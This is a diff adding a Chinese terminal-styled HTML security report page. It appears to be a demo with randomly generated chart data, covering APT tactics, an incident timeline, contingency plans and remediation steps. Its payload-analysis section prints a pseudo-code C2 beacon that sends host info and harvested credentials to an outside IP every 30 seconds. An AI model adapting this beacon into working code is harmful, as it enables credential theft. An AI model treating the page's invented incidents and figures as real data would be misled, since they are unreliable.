+                                <span style="color: var(--text-dim);">战术摘要:</span> 该组织擅长利用零日漏洞获取初始访问权限，后续阶段大量使用 Living-off-the-Land 技术规避检测。其工具链包含定制化加载器、内存注入框架及加密通信协议。历史记录显示该组织具备长期潜伏能力，平均驻留时间超过 180 天。
+                            </div>
+                        </div>
+                    </div>
+
+                    <div class="loading-bar"></div>
+                </div>
+            </div>
+
+            <!-- Network Analysis -->
+            <div class="terminal-window reveal" id="sec-network">
+                <div class="terminal-titlebar">
+                    <div class="terminal-dots"><span></span><span></span><span></span></div>
+                    <span class="terminal-filename">/net/analysis/radar_map.json</span>
+                </div>
+                <div class="terminal-body">
+                    <h2 class="section-title">网络分析</h2>
+                    <div class="section-subtitle">多向量威胁面映射</div>
+
+                    <div class="data-grid-2">
+                        <div class="chart-body" id="chart-radar"></div>
+                        <div>
+                            <div class="metric-row">
+                                <span class="metric-label">边界防护</span>
+                                <span class="metric-dots"></span>
+                                <span class="metric-value">已加固</span>
+                            </div>
+                            <div class="metric-row">
+                                <span class="metric-label">内部分段</span>
+                                <span class="metric-dots"></span>
+                                <span class="metric-value alert">部分完成</span>
+                            </div>
+                            <div class="metric-row">
+                                <span class="metric-label">DNS 安全</span>
+                                <span class="metric-dots"></span>
+                                <span class="metric-value">已启用</span>
+                            </div>
+                            <div class="metric-row">
+                                <span class="metric-label">IDS/IPS</span>
+                                <span class="metric-dots"></span>
+                                <span class="metric-value">签名数: 47,892</span>
+                            </div>
+                            <div class="metric-row">
+                                <span class="metric-label">VPN 隧道</span>
+                                <span class="metric-dots"></span>
+                                <span class="metric-value">24 个活跃</span>
+                            </div>
+                            <div class="metric-row">
+                                <span class="metric-label">异常</span>
+                                <span class="metric-dots"></span>
+                                <span class="metric-value alert">12 个已标记</span>
+                            </div>
+                            <div class="metric-row">
+                                <span class="metric-label">带宽</span>
+                                <span class="metric-dots"></span>
+                                <span class="metric-value">平均 4.7 Gbps</span>
+                            </div>
+                            <div class="metric-row">
+                                <span class="metric-label">丢包率</span>
+                                <span class="metric-dots"></span>
+                                <span class="metric-value">0.002%</span>
+                            </div>
+                        </div>
+                    </div>
+
+                    <div class="loading-bar"></div>
+                </div>
+            </div>
+
+            <!-- Incident Timeline -->
+            <div class="terminal-window reveal" id="sec-timeline">
+                <div class="terminal-titlebar">
+                    <div class="terminal-dots"><span></span><span></span><span></span></div>
+                    <span class="terminal-filename">/var/incidents/timeline_Q4.log</span>
+                </div>
+                <div class="terminal-body">
+                    <h2 class="section-title">事件时间线</h2>
+                    <div class="section-subtitle">安全事件时间线 // 最近 72 小时</div>
+
+                    <div class="timeline">
+                        <div class="timeline-item">
+                            <div class="timeline-dot alert"></div>
+                            <div class="timeline-time">2024-12-14 02:17:33 UTC</div>
+                            <div class="timeline-title"><span class="status-dot pink"></span>检测到暴力破解攻击</div>
+                            <div class="timeline-desc">SSH 端点 10.0.4.22 收到来自 185.220.101.x 子网的 4,700+ 次认证尝试。已自动封锁。</div>
+                        </div>
+                        <div class="timeline-item">
+                            <div class="timeline-dot alert"></div>
+                            <div class="timeline-time">2024-12-13 18:42:07 UTC</div>
+                            <div class="timeline-title"><span class="status-dot pink"></span>数据外泄尝试</div>
+                            <div class="timeline-desc">工作站 WKS-0847 检测到异常出站数据传输 (2.4 GB)。连接已终止。</div>
+                        </div>
+                        <div class="timeline-item">
+                            <div class="timeline-dot standby"></div>
+                            <div class="timeline-time">2024-12-13 14:05:51 UTC</div>
+                            <div class="timeline-title"><span class="status-dot purple"></span>证书过期预警</div>
+                            <div class="timeline-desc">api.internal.corp 的 TLS 证书将在 14 天内过期。已排入续期队列。</div>
+                        </div>
+                        <div class="timeline-item">
+                            <div class="timeline-dot"></div>
+                            <div class="timeline-time">2024-12-13 09:22:18 UTC</div>
+                            <div class="timeline-title"><span class="status-dot green"></span>补丁部署完成</div>
+                            <div class="timeline-desc">CVE-2024-6504 补丁已成功部署至 847 个节点。验证通过。</div>
+                        </div>
+                        <div class="timeline-item">
+                            <div class="timeline-dot alert"></div>
+                            <div class="timeline-time">2024-12-12 23:58:44 UTC</div>
+                            <div class="timeline-title"><span class="status-dot pink"></span>检测到权限提升</div>
+                            <div class="timeline-desc">DB-PROD-03 上检测到未授权的 root 访问尝试。已通过零信任策略隔离。正在调查中。</div>
+                        </div>
+                        <div class="timeline-item">
+                            <div class="timeline-dot"></div>
+                            <div class="timeline-time">2024-12-12 16:30:00 UTC</div>
+                            <div class="timeline-title"><span class="status-dot green"></span>计划扫描完成</div>
+                            <div class="timeline-desc">全网漏洞扫描已完成。发现 7 个新问题，详见上文。</div>
+                        </div>
+                    </div>
+
+                    <div class="loading-bar"></div>
+                </div>
+            </div>
+
+            <!-- Payload Analysis -->
+            <div class="terminal-window reveal" id="sec-payload">
+                <div class="terminal-titlebar">
+                    <div class="terminal-dots"><span></span><span></span><span></span></div>
+                    <span class="terminal-filename">/quarantine/payload_analysis.bin</span>
+                </div>
+                <div class="terminal-body">
+                    <h2 class="section-title">载荷分析</h2>
+                    <div class="section-subtitle">恶意软件样本反编译 // 沙箱环境</div>
+
+                    <div class="data-grid-2">
+                        <div>
+                            <div class="code-block"><span class="comment">// 提取的载荷 - 已去混淆</span>
+<span class="keyword">function</span> <span class="function">initC2</span>(<span class="string">"185.220.101.42"</span>, <span class="number">4443</span>) {
+  <span class="keyword">let</span> beacon = <span class="function">encrypt</span>(<span class="string">"AES-256-CBC"</span>);
+  <span class="keyword">const</span> interval = <span class="number">30000</span>; <span class="comment">// 30秒回调</span>
+  <span class="keyword">while</span> (active) {
+    <span class="function">sendBeacon</span>(beacon, {
+      host: <span class="function">getHostInfo</span>(),
+      priv: <span class="function">checkPriv</span>(),
+      data: <span class="function">harvestCreds</span>()
+    });
+    <span class="function">sleep</span>(interval);
+  }
+}
+<span class="comment">// SHA256: a7f3c8d2e1b...</span></div>
+
+                            <div class="metric-row" style="margin-top: 1rem;">
+                                <span class="metric-label">类型</span>
+                                <span class="metric-dots"></span>
+                                <span class="metric-value alert">木马/远控</span>
+                            </div>
+                            <div class="metric-row">
+                                <span class="metric-label">家族</span>
+                                <span class="metric-dots"></span>
+                                <span class="metric-value">COBALT STRIKE</span>
+                            </div>
+                            <div class="metric-row">
+                                <span class="metric-label">混淆方式</span>
+                                <span class="metric-dots"></span>
+                                <span class="metric-value">多层 XOR</span>
+                            </div>
+                        </div>
+                        <div>
+                            <div class="chart-body-sm" id="chart-payload"></div>
+                            <div style="margin-top: 0.8rem;">
+                                <div class="metric-row">
+                                    <span class="metric-label">检测率</span>
+                                    <span class="metric-dots"></span>
+                                    <span class="metric-value">38/72 引擎</span>
+                                </div>
+                                <div class="metric-row">
+                                    <span class="metric-label">首次发现</span>
+                                    <span class="metric-dots"></span>
+                                    <span class="metric-value">2024-12-10</span>
+                                </div>
+                                <div class="metric-row">
+                                    <span class="metric-label">IOC 数量</span>
+                                    <span class="metric-dots"></span>
+                                    <span class="metric-value alert">47</span>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+
+                    <div class="loading-bar"></div>
+                </div>
+            </div>
+
+            <!-- Contingency Protocol -->
+            <div class="terminal-window reveal" id="sec-contingency">
+                <div class="terminal-titlebar">
+                    <div class="terminal-dots"><span></span><span></span><span></span></div>
+                    <span class="terminal-filename">/protocols/contingency_plan_v4.2.conf</span>
+                </div>
+                <div class="terminal-body">
+                    <h2 class="section-title">应急预案 // CONTINGENCY PROTOCOL</h2>
+                    <div class="section-subtitle">分级响应程序 // 最后更新: 2024-12-14 04:00 UTC</div>
+
+                    <p style="margin-bottom: 1.2rem; color: var(--text);">
+                        根据当前威胁态势评估，启动<span style="color: var(--pink);">二级应急响应</span>。以下为各威胁场景对应的标准化处置程序。所有操作需在安全运维中心（SOC）统一协调下执行，关键操作需获得 CISO 书面授权。
+                    </p>
+
+                    <div class="ascii-divider">───────────────────────────────────────────────────────────────</div>
+
+                    <div style="margin-top: 1rem; margin-bottom: 1.5rem;">
+                        <div style="color: var(--green); font-weight: 600; margin-bottom: 0.8rem;">SCENARIO-A: 大规模凭证泄露</div>
+                        <p style="color: var(--text); margin-bottom: 0.8rem; font-size: var(--small-size);">
+                            场景描述: 域管理员凭证确认泄露，攻击者可能已获取 Active Directory 完整控制权限。影响范围覆盖全部 847 个域内节点。
+                        </p>
+                        <div style="padding-left: 1rem; border-left: 2px solid var(--pink);">
+                            <div style="margin-bottom: 0.6rem;">
+                                <span class="badge badge-critical">P0</span>
+                                <span style="color: var(--text); margin-left: 0.5rem;">1. 立即重置所有特权账户密码（域管、服务账户、紧急访问账户）</span>
+                            </div>
+                            <div style="margin-bottom: 0.6rem; padding-left: 1.5rem; color: var(--text-dim); font-size: var(--small-size);">
+                                └─ 使用离线密码重置工具，避免触发攻击者部署的凭证监控
+                            </div>
+                            <div style="margin-bottom: 0.6rem;">
+                                <span class="badge badge-critical">P0</span>
+                                <span style="color: var(--text); margin-left: 0.5rem;">2. 撤销所有活跃 Kerberos 票据，执行 KRBTGT 密码双重重置</span>
+                            </div>
+                            <div style="margin-bottom: 0.6rem; padding-left: 1.5rem; color: var(--text-dim); font-size: var(--small-size);">
+                                └─ 两次重置间隔需 &gt; 12 小时，确保票据最大生命周期覆盖
+                            </div>
+                            <div style="margin-bottom: 0.6rem;">
+                                <span class="badge badge-high">P1</span>
+                                <span style="color: var(--text); margin-left: 0.5rem;">3. 启用所有管理员账户 MFA 强制策略，禁用遗留认证协议</span>
+                            </div>
+                            <div style="margin-bottom: 0.6rem;">
+                                <span class="badge badge-high">P1</span>
+                                <span style="color: var(--text); margin-left: 0.5rem;">4. 对 DC 进行完整性校验，排查 Golden Ticket / DCSync 攻击痕迹</span>
+                            </div>
+                        </div>
+                    </div>
+
+                    <div style="margin-bottom: 1.5rem;">
+                        <div style="color: var(--green); font-weight: 600; margin-bottom: 0.8rem;">SCENARIO-B: C2 基础设施持久化</div>
+                        <p style="color: var(--text); margin-bottom: 0.8rem; font-size: var(--small-size);">
+                            场景描述: 攻击者已在内网建立多个持久化据点，C2 信标活跃通信中。存在备用通信通道风险，单点封堵可能无效。
+                        </p>
+                        <div style="padding-left: 1rem; border-left: 2px solid var(--purple);">
+                            <div style="margin-bottom: 0.6rem;">
+                                <span class="badge badge-critical">P0</span>
+                                <span style="color: var(--text); margin-left: 0.5rem;">1. 在网络边界封锁所有已知 C2 IP/域名（参见 IOC 列表 #TI-2024-1214）</span>
+                            </div>
+                            <div style="margin-bottom: 0.6rem;">
+                                <span class="badge badge-critical">P0</span>
+                                <span style="color: var(--text); margin-left: 0.5rem;">2. 部署 DNS Sinkhole 劫持 C2 域名解析，收集感染主机清单</span>
+                            </div>
+                            <div style="margin-bottom: 0.6rem; padding-left: 1.5rem; color: var(--text-dim); font-size: var(--small-size);">
+                                └─ 监控 24h 后生成最终感染范围报告
+                            </div>
+                            <div style="margin-bottom: 0.6rem;">
+                                <span class="badge badge-high">P1</span>
+                                <span style="color: var(--text); margin-left: 0.5rem;">3. 对已确认感染节点执行内存取证，提取驻留机制详情</span>
+                            </div>
+                            <div style="margin-bottom: 0.6rem;">
+                                <span class="badge badge-high">P1</span>
+                                <span style="color: var(--text); margin-left: 0.5rem;">4. 实施出站流量白名单策略，阻断未分类的加密出站连接</span>
+                            </div>
+                            <div style="margin-bottom: 0.6rem;">
+                                <span class="badge badge-medium">P2</span>
+                                <span style="color: var(--text); margin-left: 0.5rem;">5. 对清除后的节点执行 72h 增强监控，确认无备用信标激活</span>
+                            </div>
+                        </div>
+                    </div>
+
+                    <div style="margin-bottom: 1.5rem;">
+                        <div style="color: var(--green); font-weight: 600; margin-bottom: 0.8rem;">SCENARIO-C: 数据大规模外泄</div>
+                        <p style="color: var(--text); margin-bottom: 0.8rem; font-size: var(--small-size);">
+                            场景描述: 确认客户敏感数据已外泄至攻击者控制的基础设施。需启动数据泄露事件响应流程及合规通报义务。
+                        </p>
+                        <div style="padding-left: 1rem; border-left: 2px solid #ffaa00;">
+                            <div style="margin-bottom: 0.6rem;">
+                                <span class="badge badge-critical">P0</span>
+                                <span style="color: var(--text); margin-left: 0.5rem;">1. 立即通知法务团队启动数据泄露评估，确定通报义务范围</span>
+                            </div>
+                            <div style="margin-bottom: 0.6rem;">
+                                <span class="badge badge-critical">P0</span>
+                                <span style="color: var(--text); margin-left: 0.5rem;">2. 保全所有相关日志及取证证据，建立完整证据链</span>
+                            </div>
+                            <div style="margin-bottom: 0.6rem;">
+                                <span class="badge badge-high">P1</span>
+                                <span style="color: var(--text); margin-left: 0.5rem;">3. 精确识别外泄数据范围，生成受影响客户清单</span>
+                            </div>
+                            <div style="margin-bottom: 0.6rem; padding-left: 1.5rem; color: var(--text-dim); font-size: var(--small-size);">
+                                └─ 交叉比对 DLP 日志与数据库审计记录
+                            </div>
+                            <div style="margin-bottom: 0.6rem;">
+                                <span class="badge badge-high">P1</span>
+                                <span style="color: var(--text); margin-left: 0.5rem;">4. 在 72h 内完成监管机构报告（GDPR Art.33 / 网络安全法要求）</span>
+                            </div>
+                            <div style="margin-bottom: 0.6rem;">
+                                <span class="badge badge-medium">P2</span>
+                                <span style="color: var(--text); margin-left: 0.5rem;">5. 制定客户通知方案，准备公关声明及 FAQ 文档</span>
+                            </div>
+                        </div>
+                    </div>
+
+                    <div class="ascii-divider">───────────────────────────────────────────────────────────────</div>
+
+                    <div style="margin-top: 1rem; color: var(--text-dim); font-size: var(--small-size);">
+                        <span style="color: var(--purple);">[PROTOCOL STATUS]</span> 上述预案已经安全委员会审批（批准编号: SC-2024-Q4-007）。各场景预案每季度进行桌面推演验证。下次推演时间: 2025-01-15。负责人: SOC 主管 / CISO。
+                    </div>
+
+                    <div class="loading-bar"></div>
+                </div>
+            </div>
+
+            <!-- Recommendations -->
+            <div class="terminal-window reveal" id="sec-recommendations">
+                <div class="terminal-titlebar">
+                    <div class="terminal-dots"><span></span><span></span><span></span></div>
+                    <span class="terminal-filename">/actions/recommendations_v3.conf</span>
+                </div>
+                <div class="terminal-body">
+                    <h2 class="section-title">修复建议</h2>
+                    <div class="section-subtitle">优先级操作项 // 安全运维</div>
+
+                    <ol class="rec-list">
+                        <li>
+                            <div class="rec-content">
+                                <div class="rec-title">立即修补严重 CVE <span class="badge badge-critical">P0</span></div>
+                                <div class="rec-desc">CVE-2024-8732 和 CVE-2024-7891 需要立即修补。两者均在野外被积极利用。预计用时：4 小时。</div>
+                            </div>
+                        </li>
+                        <li>
+                            <div class="rec-content">
+                                <div class="rec-title">隔离受损工作站 <span class="badge badge-critical">P0</span></div>
+                                <div class="rec-desc">WKS-0847 必须完全隔离以进行取证分析。关联用户账号需进行凭证轮换。</div>
+                            </div>
+                        </li>
+                        <li>
+                            <div class="rec-content">
+                                <div class="rec-title">加强网络分段 <span class="badge badge-high">P1</span></div>
+                                <div class="rec-desc">内部分段仅部分完成。需在数据库层实施微分段以防止横向移动。</div>
+                            </div>
+                        </li>
+                        <li>
+                            <div class="rec-content">
+                                <div class="rec-title">更新 IDS 签名 <span class="badge badge-high">P1</span></div>
+                                <div class="rec-desc">在所有网络传感器上部署更新的 Cobalt Strike 信标检测签名。当前签名已过期 72 小时。</div>
+                            </div>
+                        </li>
+                        <li>
+                            <div class="rec-content">
+                                <div class="rec-title">轮换 TLS 证书 <span class="badge badge-medium">P2</span></div>
+                                <div class="rec-desc">3 个内部证书将在 14 天内过期。安排自动续期并实施证书监控。</div>
+                            </div>
+                        </li>
+                        <li>
+                            <div class="rec-content">
+                                <div class="rec-title">审查 SSH 访问控制 <span class="badge badge-medium">P2</span></div>
+                                <div class="rec-desc">暴力破解尝试表明存在暴露的 SSH 端点。将所有 SSH 迁移至证书认证，禁用密码认证。</div>
+                            </div>
+                        </li>
+                        <li>
+                            <div class="rec-content">
+                                <div class="rec-title">安全意识培训 <span class="badge badge-low">P3</span></div>
+                                <div class="rec-desc">安排全员季度钓鱼模拟演练。上次培训完成率：67%（目标：95%）。</div>
+                            </div>
+                        </li>
+                    </ol>
+
+                    <div class="loading-bar"></div>
+                </div>
+            </div>
+
+            <!-- System Signature -->
+            <div class="system-signature reveal">
+                <div class="ascii-divider">════════════════════════════════════════════════════════════════</div>
+                <div style="margin: 0.5rem 0;">报告生成方: SENTINEL v4.7.2 // 自主威胁分析引擎</div>
+                <div class="hash">SHA256: a7f3c8d2e1b94f6a0d5c7e8b2f1a3d4e6c9b0a8f7e5d2c1b4a6f8e0d3c5b7a9</div>
+                <div style="margin-top: 0.5rem;">时间戳: 2024-12-14T04:22:17.847Z // 节点: SECOPS-PRIMARY-01</div>
+                <div class="ascii-divider">════════════════════════════════════════════════════════════════</div>
+            </div>
+
+        </div>
+    </div>
+
+    <button class="back-to-top" id="backToTop">^</button>
+
+    <script>
+        class ReportPresentation {
+            constructor() {
+                this.scrollProgress = document.getElementById('scrollProgress');
+                this.backToTop = document.getElementById('backToTop');
+                this.initRevealAnimations();
+                this.initCharts();
+                this.initCounters();
+                this.initBackToTop();
+                this.initScrollProgress();
+            }
+
+            initRevealAnimations() {
+                const reveals = document.querySelectorAll('.reveal');
+                const observer = new IntersectionObserver((entries) => {
+                    entries.forEach(entry => {
+                        if (entry.isIntersecting) {
+                            entry.target.classList.add('visible');
+                        }
+                    });
+                }, { threshold: 0.05, rootMargin: '0px 0px -20px 0px' });
+                reveals.forEach(el => observer.observe(el));
+            }
+
+            initCounters() {
+                const counters = document.querySelectorAll('.counter-value');
+                const observer = new IntersectionObserver((entries) => {
+                    entries.forEach(entry => {
+                        if (entry.isIntersecting && !entry.target.dataset.animated) {
+                            entry.target.dataset.animated = 'true';
+                            this.animateCounter(entry.target);
+                        }
+                    });
+                }, { threshold: 0.5 });
+                counters.forEach(el => observer.observe(el));
+            }
+
+            animateCounter(el) {
+                const target = parseFloat(el.dataset.target);
+                const suffix = el.dataset.suffix || '';
+                const isFloat = target % 1 !== 0;
+                const duration = 600;
+                const startTime = performance.now();
+
+                const animate = (currentTime) => {
+                    const elapsed = currentTime - startTime;
+                    const progress = Math.min(elapsed / duration, 1);
+                    const eased = 1 - Math.pow(1 - progress, 3);
+
+                    if (progress < 1) {
+                        // Scramble effect: show random digits while animating
+                        const current = target * eased;
+                        if (isFloat) {
+                            el.textContent = current.toFixed(1) + suffix;
+                        } else {
+                            el.textContent = Math.floor(current).toLocaleString() + suffix;
+                        }
+                        requestAnimationFrame(animate);
+                    } else {
+                        if (isFloat) {
+                            el.textContent = target.toFixed(1) + suffix;
+                        } else {
+                            el.textContent = target.toLocaleString() + suffix;
+                        }
+                    }
+                };
+
+                requestAnimationFrame(animate);
+            }
+
+            initScrollProgress() {
+                window.addEventListener('scroll', () => {
+                    const scrollTop = window.scrollY;
+                    const docHeight = document.documentElement.scrollHeight - window.innerHeight;
+                    const progress = docHeight > 0 ? (scrollTop / docHeight) * 100 : 0;
+                    this.scrollProgress.style.width = progress + '%';
+                });
+            }
+
+            initBackToTop() {
+                window.addEventListener('scroll', () => {
+                    if (window.scrollY > 400) {
+                        this.backToTop.classList.add('visible');
+                    } else {
+                        this.backToTop.classList.remove('visible');
+                    }
+                });
+                this.backToTop.addEventListener('click', () => {
+                    window.scrollTo({ top: 0, behavior: 'smooth' });
+                });
+            }
+
+            initCharts() {
+                this.initThreatChart();
+                this.initVulnChart();
+                this.initRadarChart();
+                this.initPayloadChart();
+
+                window.addEventListener('resize', () => {
+                    echarts.getInstanceByDom(document.getElementById('chart-threats'))?.resize();
+                    echarts.getInstanceByDom(document.getElementById('chart-vuln'))?.resize();
+                    echarts.getInstanceByDom(document.getElementById('chart-radar'))?.resize();
+                    echarts.getInstanceByDom(document.getElementById('chart-payload'))?.resize();
+                });
+            }
+
+            initThreatChart() {
+                const chart = echarts.init(document.getElementById('chart-threats'));
+                const days = [];
+                const blocked = [];
+                const penetrations = [];
+
+                for (let i = 29; i >= 0; i--) {
+                    const d = new Date(2024, 11, 14);
+                    d.setDate(d.getDate() - i);
+                    days.push((d.getMonth() + 1) + '/' + d.getDate());
+                    blocked.push(Math.floor(350 + Math.random() * 200));
+                    penetrations.push(Math.floor(3 + Math.random() * 15));
+                }
+
+                chart.setOption({
+                    backgroundColor: 'transparent',
+                    grid: { top: 30, right: 50, bottom: 30, left: 50 },
+                    tooltip: {
+                        trigger: 'axis',
+                        backgroundColor: '#111',
+                        borderColor: 'rgba(0,255,136,0.3)',
+                        textStyle: { color: '#b8f4b8', fontFamily: 'JetBrains Mono', fontSize: 11 }
+                    },
+                    legend: {
+                        data: ['已拦截', '渗透'],
+                        textStyle: { color: '#b8f4b8', fontFamily: 'JetBrains Mono', fontSize: 10 },
+                        top: 0,
+                        right: 0
+                    },
+                    xAxis: {
+                        type: 'category',
+                        data: days,
+                        axisLine: { lineStyle: { color: 'rgba(0,255,136,0.2)' } },
+                        axisLabel: { color: 'rgba(184,244,184,0.5)', fontSize: 9, fontFamily: 'JetBrains Mono', interval: 4 },
+                        splitLine: { show: false }
+                    },
+                    yAxis: [
+                        {
+                            type: 'value',
+                            name: '已拦截',
+                            nameTextStyle: { color: 'rgba(184,244,184,0.5)', fontSize: 9, fontFamily: 'JetBrains Mono' },
+                            axisLine: { show: false },
+                            splitLine: { lineStyle: { color: 'rgba(0,255,136,0.06)', type: 'dashed' } },
+                            axisLabel: { color: 'rgba(184,244,184,0.5)', fontSize: 9, fontFamily: 'JetBrains Mono' }
+                        },
+                        {
+                            type: 'value',
+                            name: '渗透',
+                            nameTextStyle: { color: 'rgba(184,244,184,0.5)', fontSize: 9, fontFamily: 'JetBrains Mono' },
+                            axisLine: { show: false },
+                            splitLine: { show: false },
+                            axisLabel: { color: 'rgba(184,244,184,0.5)', fontSize: 9, fontFamily: 'JetBrains Mono' }
+                        }
+                    ],
+                    series: [
+                        {
+                            name: '已拦截',
+                            type: 'line',
+                            data: blocked,
+                            smooth: true,
+                            lineStyle: { color: '#00ff88', width: 1.5 },
+                            itemStyle: { color: '#00ff88' },
+                            symbol: 'none',
+                            areaStyle: {
+                                color: new echarts.graphic.LinearGradient(0, 0, 0, 1, [
+                                    { offset: 0, color: 'rgba(0,255,136,0.15)' },
+                                    { offset: 1, color: 'rgba(0,255,136,0)' }
+                                ])
+                            }
+                        },
+                        {
+                            name: '渗透',
+                            type: 'line',
+                            yAxisIndex: 1,
+                            data: penetrations,
+                            smooth: true,
+                            lineStyle: { color: '#ff0080', width: 1.5 },
+                            itemStyle: { color: '#ff0080' },
+                            symbol: 'none',
+                            areaStyle: {
+                                color: new echarts.graphic.LinearGradient(0, 0, 0, 1, [
+                                    { offset: 0, color: 'rgba(255,0,128,0.1)' },
+                                    { offset: 1, color: 'rgba(255,0,128,0)' }
+                                ])
+                            }
+                        }
+                    ]
+                });
+            }
+
+            initVulnChart() {
+                const chart = echarts.init(document.getElementById('chart-vuln'));
+                chart.setOption({
+                    backgroundColor: 'transparent',
+                    grid: { top: 20, right: 20, bottom: 30, left: 80 },
+                    tooltip: {
+                        trigger: 'axis',
+                        backgroundColor: '#111',
+                        borderColor: 'rgba(0,255,136,0.3)',
+                        textStyle: { color: '#b8f4b8', fontFamily: 'JetBrains Mono', fontSize: 11 }
+                    },
+                    xAxis: {
+                        type: 'value',
+                        axisLine: { lineStyle: { color: 'rgba(0,255,136,0.2)' } },
+                        splitLine: { lineStyle: { color: 'rgba(0,255,136,0.06)', type: 'dashed' } },
+                        axisLabel: { color: 'rgba(184,244,184,0.5)', fontSize: 9, fontFamily: 'JetBrains Mono' }
+                    },
+                    yAxis: {
+                        type: 'category',
+                        data: ['低危', '中等', '高危', '严重'],
+                        axisLine: { lineStyle: { color: 'rgba(0,255,136,0.2)' } },
+                        axisLabel: { color: 'rgba(184,244,184,0.7)', fontSize: 9, fontFamily: 'JetBrains Mono' }
+                    },
+                    series: [
+                        {
+                            type: 'bar',
+                            data: [
+                                { value: 12, itemStyle: { color: '#6c5ce7' } },
+                                { value: 28, itemStyle: { color: '#ffaa00' } },
+                                { value: 8, itemStyle: { color: '#ff6b35' } },
+                                { value: 3, itemStyle: { color: '#ff0080' } }
+                            ],
+                            barWidth: '50%',
+                            label: {
+                                show: true,
+                                position: 'right',
+                                color: '#b8f4b8',
+                                fontSize: 10,
+                                fontFamily: 'JetBrains Mono'
+                            }
+                        }
+                    ]
+                });
+            }
+
+            initRadarChart() {
+                const chart = echarts.init(document.getElementById('chart-radar'));
+                chart.setOption({
+                    backgroundColor: 'transparent',
+                    tooltip: {
+                        backgroundColor: '#111',
+                        borderColor: 'rgba(0,255,136,0.3)',
+                        textStyle: { color: '#b8f4b8', fontFamily: 'JetBrains Mono', fontSize: 11 }
+                    },
+                    radar: {
+                        indicator: [
+                            { name: '边界', max: 100 },
+                            { name: '终端', max: 100 },
+                            { name: '应用', max: 100 },
+                            { name: '数据', max: 100 },
+                            { name: '身份', max: 100 },
+                            { name: '网络', max: 100 }
+                        ],
+                        axisName: { color: 'rgba(184,244,184,0.7)', fontSize: 9, fontFamily: 'JetBrains Mono' },
+                        splitLine: { lineStyle: { color: 'rgba(0,255,136,0.1)' } },
+                        splitArea: { show: false },
+                        axisLine: { lineStyle: { color: 'rgba(0,255,136,0.15)' } }
+                    },
+                    series: [
+                        {
+                            type: 'radar',
+                            data: [
+                                {
+                                    value: [92, 78, 85, 71, 88, 65],
+                                    name: '当前',
+                                    lineStyle: { color: '#00ff88', width: 2 },
+                                    itemStyle: { color: '#00ff88' },
+                                    areaStyle: { color: 'rgba(0,255,136,0.1)' }
+                                },
+                                {
+                                    value: [85, 60, 72, 68, 75, 80],
+                                    name: '上期',
+                                    lineStyle: { color: '#6c5ce7', width: 1.5, type: 'dashed' },
+                                    itemStyle: { color: '#6c5ce7' },
+                                    areaStyle: { color: 'rgba(108,92,231,0.05)' }
+                                }
+                            ]
+                        }
+                    ]
+                });
+            }
+
+            initPayloadChart() {
+                const chart = echarts.init(document.getElementById('chart-payload'));
+                chart.setOption({
+                    backgroundColor: 'transparent',
+                    tooltip: {
+                        backgroundColor: '#111',
+                        borderColor: 'rgba(0,255,136,0.3)',
+                        textStyle: { color: '#b8f4b8', fontFamily: 'JetBrains Mono', fontSize: 11 }
+                    },
+                    legend: {
+                        orient: 'horizontal',
+                        bottom: 0,
+                        textStyle: { color: 'rgba(184,244,184,0.7)', fontSize: 9, fontFamily: 'JetBrains Mono' },
+                        itemWidth: 10,
+                        itemHeight: 10
+                    },
+                    series: [
+                        {
+                            type: 'pie',
+                            radius: ['35%', '60%'],
+                            center: ['50%', '42%'],
+                            label: {
+                                color: '#b8f4b8',
+                                fontSize: 9,
+                                fontFamily: 'JetBrains Mono',
+                                formatter: '{b}: {d}%'
+                            },
+                            labelLine: { lineStyle: { color: 'rgba(0,255,136,0.3)' } },
+                            data: [
+                                { value: 42, name: 'C2 通信', itemStyle: { color: '#ff0080' } },
+                                { value: 28, name: '凭证窃取', itemStyle: { color: '#00ff88' } },
+                                { value: 18, name: '持久化', itemStyle: { color: '#6c5ce7' } },
+                                { value: 12, name: '侦察', itemStyle: { color: '#ffaa00' } }
+                            ]
+                        }
+                    ]
+                });
+            }
+        }
+
+        // Initialize
+        document.addEventListener('DOMContentLoaded', () => {
+            new ReportPresentation();
+        });
+    </script>
+</body>
+</html>
